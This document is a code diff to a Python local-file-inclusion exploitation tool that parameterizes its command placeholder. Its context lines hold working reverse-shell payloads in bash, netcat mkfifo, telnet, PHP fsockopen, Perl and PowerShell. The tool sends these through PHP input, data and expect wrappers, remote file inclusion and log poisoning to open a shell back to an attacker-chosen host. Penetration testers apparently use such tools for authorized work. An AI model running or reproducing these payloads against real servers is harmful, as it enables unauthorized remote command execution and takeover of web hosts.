@@ -26,6 +26,7 @@ exploits = []
 proxies = {}
 rfi_test_port = 443
 scriptName = ""
+tempArg = ""
 
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -116,7 +117,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
     if(checkPayload(req)):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
-                u = getVal.replace(TO_REPLACE[i], "CMD")
+                u = getVal.replace(TO_REPLACE[i], tempArg)
                 
                 #TODO this can be better
                 if("windows" in TO_REPLACE[i].lower()):
@@ -343,7 +344,7 @@ def test_data(url):
 def test_input(url):
     if(args.postreq):
         if(args.verbose): print("$_POST args are not LFI-able using php://input. Skipping input wrapper test...")
-    return
+        return
 
     if(args.verbose):
         print("Testing input wrapper...")
@@ -497,26 +498,26 @@ def exploit_bash(exploit, method, ip, port):
     bashPayloadStageTwo = "bash+/tmp/1.sh"
 
     if(method == "INPUT"):
-        res = requests.post(url.replace('CMD', bashTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+        res = requests.post(url.replace(tempArg, bashTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
         if('/bash' in res.text):
-            u = url.replace('CMD', bashPayloadStageOne)
+            u = url.replace(tempArg, bashPayloadStageOne)
             printInfo(ip, port, 'bash', 'input wrapper')
             requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-            requests.post(url.replace('CMD', bashPayloadStageTwo), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+            requests.post(url.replace(tempArg, bashPayloadStageTwo), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', bashTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, bashTest), headers = headers, proxies = proxies)
         if('/bash' in res.text):
             printInfo(ip, port, 'bash', 'data wrapper')
-            requests.get(url.replace('CMD', bashPayloadStageOne), headers = headers, proxies = proxies)
-            requests.get(url.replace('CMD', bashPayloadStageTwo), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, bashPayloadStageOne), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, bashPayloadStageTwo), headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-        res = requsts.get(url.replace('CMD', bashTest), headers = headers, proxies = proxies)
+        res = requsts.get(url.replace(tempArg, bashTest), headers = headers, proxies = proxies)
         if('/bash' in res.text):
             printInfo(ip, port, 'bash', 'expect wrapper')
-            requests.get(url.replace('CMD', bashPayloadStageOne), headers = headers, proxies = proxies)
-            requests.get(url.replace('CMD', bashPayloadStageTwo), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, bashPayloadStageOne), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, bashPayloadStageTwo), headers = headers, proxies = proxies)
             return True
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, bashPayloadStageOne, bashPayloadStageTwo, bashTest, "/bash")
@@ -531,22 +532,22 @@ def exploit_nc(exploit, method, ip, port):
     ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
 
     if(method == "INPUT"):
-        res = requests.post(url.replace('CMD', ncTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+        res = requests.post(url.replace(tempArg, ncTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
         if('/bin' in res.text and '/nc' in res.text):
             printInfo(ip, port, 'nc', 'input wrapper')
-            requests.post(url.replace('CMD', ncPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+            requests.post(url.replace(tempArg, ncPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', ncTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, ncTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/nc' in res.text):
             printInfo(ip, port, 'nc', 'data wrapper')
-            requests.get(url.replace('CMD', ncPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, ncPayload), headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-        res = requests.get(url.replace('CMD', ncTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, ncTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/nc' in res.text):
             printInfo(ip, port, 'nc', 'expect wrapper')
-            requests.get(url.replace('CMD', ncPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, ncPayload), headers = headers, proxies = proxies)
             return True
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, ncPayload, "", ncTest, "/nc")
@@ -561,23 +562,23 @@ def exploit_php(exploit, method, ip, port):
     phpPayload =  "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
 
     if(method == "INPUT"):
-        u = url.replace('CMD', phpTest)
+        u = url.replace(tempArg, phpTest)
         res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
         if('/bin' in res.text and '/php' in res.text):
             printInfo(ip, port, 'PHP', 'input wrapper')
-            requests.post(url.replace('CMD', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+            requests.post(url.replace(tempArg, phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', phpTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, phpTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/php' in res.text):
             printInfo(ip, port, 'PHP', 'data wrapper')
-            requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, phpPayload), headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-        res = requests.get(url.replace('CMD', phpTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, phpTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/php' in res.text):
             printInfo(ip, port, 'PHP', 'expect wrapper')
-            requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, phpPayload), headers = headers, proxies = proxies)
             return True
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, phpPayload, "", phpTest, "/nc")
@@ -593,23 +594,23 @@ def exploit_perl(exploit, method, ip, port):
                   "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
 
     if(method == "INPUT"): 
-        res = requests.post(url.replace('CMD', perlTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+        res = requests.post(url.replace(tempArg, perlTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
         if('/bin' in res.text and '/perl' in res.text):
-            u = url.replace('CMD', perlPayload)
+            u = url.replace(tempArg, perlPayload)
             printInfo(ip, port, 'perl', 'input wrapper')
             requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', perlTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, perlTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/perl' in res.text):
             printInfo(ip, port, 'perl', 'data wrapper')
-            requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, perlPayload), headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-        res = requests.get(url.replace('CMD', perlTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, perlTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/perl' in res.text):
             printInfo(ip, port, 'perl', 'expect wrapper')
-            requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
+            requests.get(url.replace(tempArg, perlPayload), headers = headers, proxies = proxies)
             return True
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, perlPayload, "", perlTest, "/perl")
@@ -623,23 +624,23 @@ def exploit_telnet(exploit, method, ip, port):
     telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))
 
     if(method == "INPUT"):
-        res = requests.post(url.replace('CMD', telnetTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+        res = requests.post(url.replace(tempArg, telnetTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
         if('/bin' in res.text and '/telnet' in res.text):
-            u = url.replace('CMD', telnetPayload)
+            u = url.replace(tempArg, telnetPayload)
             printInfo(ip, port, 'telnet', 'input wrapper')
             requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', telnetTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, telnetTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/telnet' in res.text):
-            u = url.replace('CMD', telnetPayload)
+            u = url.replace(tempArg, telnetPayload)
             printInfo(ip, port, 'telnet', 'data wrapper')
             requests.get(u, headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-        res = requests.get(url.replace('CMD', telnetTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, telnetTest), headers = headers, proxies = proxies)
         if('/bin' in res.text and '/telnet' in res.text):
-            u = url.replace('CMD', telnetPayload)
+            u = url.replace(tempArg, telnetPayload)
             printInfo(ip, port, 'telnet', 'expect wrapper')
             requests.get(u, headers = headers, proxies = proxies)
             return True
@@ -661,23 +662,23 @@ def exploit_powershell(exploit, method, ip, port):
     powershellPayload = powershellPayload.replace("{PORT}", str(port))
 
     if(method == "INPUT"):
-        res = requests.post(url.replace('CMD', powershellTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+        res = requests.post(url.replace(tempArg, powershellTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
         if('Windows IP Configuration' in res.text):
-            u = url.replace('CMD', powershellPayload) 
+            u = url.replace(tempArg, powershellPayload) 
             requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
             printInfo(ip, port, 'powershell', 'input wrapper')
             return True
     if(method == "DATA"):
-        res = requests.get(url.replace('CMD', powershellTest), headers = headers, proxies = proxies)
+        res = requests.get(url.replace(tempArg, powershellTest), headers = headers, proxies = proxies)
         if('Windows IP Configuration' in res.text):
             printInfo(ip, port, 'powershell', 'data wrapper')
-            u = url.replace('CMD', powershellPayload)
+            u = url.replace(tempArg, powershellPayload)
             requests.get(u, headers = headers, proxies = proxies)
             return True
     if(method == "EXPECT"):
-            res = requests.get(url.replace('CMD', powershellTest), headers = headers, proxies = proxies)
+            res = requests.get(url.replace(tempArg, powershellTest), headers = headers, proxies = proxies)
             if('Windows IP Configuration' in res.text):
-                u = url.replace('CMD', powershellPayload)
+                u = url.replace(tempArg, powershellPayload)
                 printInfo(ip, port, 'powershell', 'expect wrapper')
                 requests.get(u, headers = headers, proxies = proxies)
                 return True
@@ -713,7 +714,7 @@ def exploit_rfi(exploit, method, ip, port):
     
 
     printInfo(ip, port, 'php', 'Remote File Inclusion')
-    requests.get(url.replace("CMD", "/reverse_shell.php"), headers = headers, proxies = proxies)
+    requests.get(url.replace(tempArg, "/reverse_shell.php"), headers = headers, proxies = proxies)
     return
 
 def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString):
@@ -724,7 +725,7 @@ def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayl
         lines = f.readlines()
         for line in lines:
             line = line[:-1]
-            u = url.replace('CMD', line)
+            u = url.replace(tempArg, line)
 
             res = requests.get(u, headers = headers, proxies = proxies)
 
@@ -1027,7 +1028,12 @@ if(__name__ == "__main__"):
                 print("[-] LPORT must be between 1 and 65534. Exiting ...")
                 sys.exit(-1)
 
-
+    #Preparing temp args
+    TEMP = ["CMD", "TEMP", "LFIMAP", "LFI"]
+    for item in TEMP:
+        if(item not in args.url):
+            tempArg = item
+            break
 
     #Preparing headers
     headers = prepareHeaders()
